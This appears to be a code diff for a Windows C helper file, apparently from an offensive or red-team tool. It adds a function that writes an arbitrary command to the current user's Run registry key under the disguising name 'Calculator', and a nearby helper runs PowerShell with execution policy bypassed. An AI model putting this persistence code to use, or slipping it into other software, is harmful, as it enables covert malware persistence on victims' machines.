@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
+#include <string.h>
 #include "helpers.h"
 
 
@@ -50,4 +51,33 @@ int run_powershell_script(char powerShellScriptPath[]) {
     char scriptCommand[bufferLen];
     snprintf(scriptCommand, bufferLen, "powershell -ExecutionPolicy Bypass -Command \"& '%s'\"", powerShellScriptPath);
     return run_command(scriptCommand);
+}
+
+int write_to_startup_regkey(char command[]) {
+    size_t bufferLen = strlen(command) + 1;
+    WCHAR command_wchar[bufferLen];
+    mbstowcs(command_wchar, command, bufferLen);
+    swprintf(command_wchar, bufferLen, L"%hs", command);
+    LPCWSTR key_name = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    HKEY key;
+
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, key_name, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
+    {
+        if (RegSetValueExW(key, L"Calculator", 0, REG_SZ, (LPBYTE)&command_wchar, sizeof(command_wchar)) == ERROR_SUCCESS)
+        {
+            printf("Command added to startup: %s \n", command);
+        }
+        else {
+            printf("Key not changed in registry :( \n");
+            printf("Error: %u ", (unsigned int)GetLastError());
+            return -1;
+        }
+    }
+    else {
+        printf("Unsuccessful in opening key  \n");
+        printf("Cannot find key value in registry \n");
+        printf("Error: %u ", (unsigned int)GetLastError());
+        return -1;
+    }
+    return 0;
 }
